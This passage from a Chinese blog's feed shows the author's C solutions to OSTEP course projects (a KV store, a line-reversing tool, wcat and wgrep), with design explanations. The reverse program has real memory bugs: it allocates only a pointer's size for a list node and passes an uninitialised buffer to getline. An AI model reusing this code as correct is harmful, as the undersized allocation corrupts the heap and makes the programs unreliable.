class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 清空文件</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> entry <span class="token operator">=</span> <span class="token function">strdup</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 条目备份</span><span class="token keyword">char</span><span class="token operator">*</span> token <span class="token operator">=</span> <span class="token function">strsep</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 当前条目键值为key，不写入（相当于删除）</span><span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> entry<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"cannot open file %s\n"</span><span class="token punctuation">,</span> DATA_BASE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>op<span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>DATA_BASE<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> data <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> p <span class="token operator">=</span> data<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">free_list_mem</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bad command\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关&lt;a href=&quot;https://github.com/remzi-arpacidusseau/ostep-projects&quot;&gt;课程项目&lt;/a&gt; 的 KV 部分，包含个人的代码实现和设计思路。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="Linux" scheme="http://lordaeronesz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP Projects：Reverse</title>
    <link href="http://lordaeronesz.github.io/2024/05/06/OSTEP%20Projects%EF%BC%9AReverse/"/>
    <id>http://lordaeronesz.github.io/2024/05/06/OSTEP%20Projects%EF%BC%9AReverse/</id>
    <published>2024-05-06T01:03:08.000Z</published>
    <updated>2024-05-06T11:51:49.235Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关<a href="https://github.com/remzi-arpacidusseau/ostep-projects">课程项目</a> 的 Reverse 部分，包含个人的代码实现和设计思路。</p><span id="more"></span><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>题目的要求很简单：按行读取数据，读取完成后将所读取到的所有行反向输出（行间反向，行内不变）。但代码实现上却包含不少细节。</p><p>首先是核心问题：如何将读取到行反向输出？首先可以确定的一点是：<strong>在所有行读取完成之前，读取到的每一个行都需要进行保存。</strong>那么，利用什么数据结构进行保存呢？我们需要这个数据结构能够确定输入的不同行之间的前后相对关系，因此想到使用<strong>线性表</strong>。由于最终读取到的行数是不确定的，因此不能使用一个固定大小的数组，而应该使用可变长的线性表，如链表、动态数组。而又因为可变数组的扩容操作比较耗时，且我们并不需要对元素进行随机访问，只需要最后输出的时候进行顺序遍历，因此链表就成为了最佳选择。</p><p>反转的具体实现可以参考经典问题<a href="https://leetcode.cn/problems/reverse-linked-list/">反转链表</a>，设定一个前驱结点 pre 和当前结点 cur，每次读取到新的行，就动态申请存储该行数据的内存空间，并将 cur 指向这块内存空间，然后将 cur 的 next 域指向 pre，然后 pre 再指向 cur，以便进行下一行的操作。</p><p>根据 README 的说明，当输入文件和输出文件是同一个文件时，程序打印相关错误信息并退出。这里一个简单的想法是使用 <code>strcmp(argv[1], argv[2])</code> 判断两个参数字符串是否相同，但文件路径的表示方式并不是唯一的，如 <code>./t1.txt</code> 和 <code>t1.txt</code> 字符串不同，但表示的却是同一个文件。一个正确的做法是使用 <code>stat()</code> 函数，用以获取文件的状态信息，并对比输入与输出文件的状态信息是否相同。</p><p>最后，输入输出部分代码的实现可以封装为一个函数，并引入参数 <code>FILE*</code>，其中标准输入（<code>stdin</code>）和标准输出（<code>stdout</code>）可以看作是一个抽象的文件，并使用 <code>fprintf()</code> 进行文件写入。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">LineNode</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span><span class="token operator">*</span> line_buf<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">LineNode</span><span class="token operator">*</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> line_node<span class="token punctuation">;</span><span class="token comment">// 判断两个路径是否表示同一个文件</span><span class="token keyword">int</span> <span class="token function">is_same_file</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> file1<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> file2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">stat</span> sb1<span class="token punctuation">,</span> sb2<span class="token punctuation">;</span><span class="token function">stat</span><span class="token punctuation">(</span>file1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sb1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">stat</span><span class="token punctuation">(</span>file2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sb2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> sb1<span class="token punctuation">.</span>st_dev <span class="token operator">==</span> sb2<span class="token punctuation">.</span>st_dev <span class="token operator">&amp;&amp;</span> sb1<span class="token punctuation">.</span>st_ino <span class="token operator">==</span> sb2<span class="token punctuation">.</span>st_ino<span class="token punctuation">;</span> <span class="token comment">// 设备ID和inode号均相同</span><span class="token punctuation">&#125;</span><span class="token comment">// 从文件fp中读取行数据</span>line_node<span class="token operator">*</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>FILE<span class="token operator">*</span> fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">size_t</span> sz <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> cur <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// 当前结点</span>line_node<span class="token operator">*</span> pre <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// 前置结点</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cur <span class="token operator">=</span> <span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>line_node<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>cur <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getline</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>cur<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sz<span class="token punctuation">,</span> fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 读到文件末尾，删去当前无效结点并结束循环</span>line_node<span class="token operator">*</span> temp <span class="token operator">=</span> cur<span class="token punctuation">;</span>cur <span class="token operator">=</span> pre<span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>cur<span class="token operator">-></span>next <span class="token operator">=</span> pre<span class="token punctuation">;</span> <span class="token comment">// 链表反转</span>pre <span class="token operator">=</span> cur<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> cur<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 写入反转后的数据到文件fp</span><span class="token keyword">void</span> <span class="token function">write_to_file</span><span class="token punctuation">(</span>line_node<span class="token operator">*</span> cur<span class="token punctuation">,</span> FILE<span class="token operator">*</span> fp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> cur<span class="token operator">-></span>line_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>line_node<span class="token operator">*</span> temp <span class="token operator">=</span> cur<span class="token punctuation">;</span>cur <span class="token operator">=</span> cur<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>line_node<span class="token operator">*</span> cur <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cur <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write_to_file</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">>=</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> argc <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"reverse: cannot open file '%s'\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>cur <span class="token operator">=</span> <span class="token function">read_from_file</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">write_to_file</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp2 <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp2 <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"reverse: cannot open file '%s'\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_same_file</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"reverse: input and output file must differ\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">write_to_file</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span> fp2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"usage: reverse &lt;input> &lt;output>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关&lt;a href=&quot;https://github.com/remzi-arpacidusseau/ostep-projects&quot;&gt;课程项目&lt;/a&gt; 的 Reverse 部分，包含个人的代码实现和设计思路。&lt;/p&gt;</summary>
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="C" scheme="http://lordaeronesz.github.io/tags/C/"/>
    
    <category term="Linux" scheme="http://lordaeronesz.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP Projects：Unix Utilities</title>
    <link href="http://lordaeronesz.github.io/2024/05/04/OSTEP%20Projects%EF%BC%9AUnix%20Utilities/"/>
    <id>http://lordaeronesz.github.io/2024/05/04/OSTEP%20Projects%EF%BC%9AUnix%20Utilities/</id>
    <published>2024-05-04T01:03:08.000Z</published>
    <updated>2024-05-04T10:24:21.316Z</updated>
    
    <content type="html"><![CDATA[<p>本文将介绍操作系统导论（Operating Systems: Three Easy Pieces）作者所开源的操作系统相关<a href="https://github.com/remzi-arpacidusseau/ostep-projects">课程项目</a> 的 Unix Utilities 部分，包含个人的代码实现和设计思路。</p><span id="more"></span><h1 id="wcat"><a href="#wcat" class="headerlink" title="wcat"></a>wcat</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>要实现一个 <code>wcat</code> 命令，打印从文件中读取到的所有字符。</p><p>编写一个 for 循环遍历所有的参数（需要读取的文件的路径），打开该文件，依照 README 中的提示使用 <code>fgets()</code> 每次读取一行，并将读取到的字符串打印到标准输出即可。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUF_SIZE</span> <span class="token expression"><span class="token number">1024</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> argc<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wcat: cannot open file\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="wgrep"><a href="#wgrep" class="headerlink" title="wgrep"></a>wgrep</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>要实现一个 <code>wgrep</code> 命令，进行字符串匹配。</p><p>根据 README 中的提示，本题测试样例中一行的字符可能会很长，因此建议使用 <code>getline()</code> 这类动态分配内存的函数（无需预先指定缓冲区大小）。这里要求当只有一个参数 <code>term</code> 时，从标准输入中读取字符串，读取方式与从文件中读取一致，区别在于文件流参数的不同：从文件中读取为调用 <code>fopen()</code> 返回的指针，而从标准输入读取为 <code>stdin</code>。</p><p>每次读取一行字符串后，需要判断该字符串中是否存在指定的子串 <code>term</code>，这就回到了经典的字符串匹配的问题上。为了代码编写的方便，这里我使用的是最简单的朴素字符串匹配算法，当然也可以使用有限自动机、KMP 算法、Boyer-Moore 算法等更为高效的算法，值得注意的是，Unix 系统的 <code>grep</code> 命令使用的正是 Boyer-Moore 算法。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token comment">// 朴素字符串匹配算法</span><span class="token 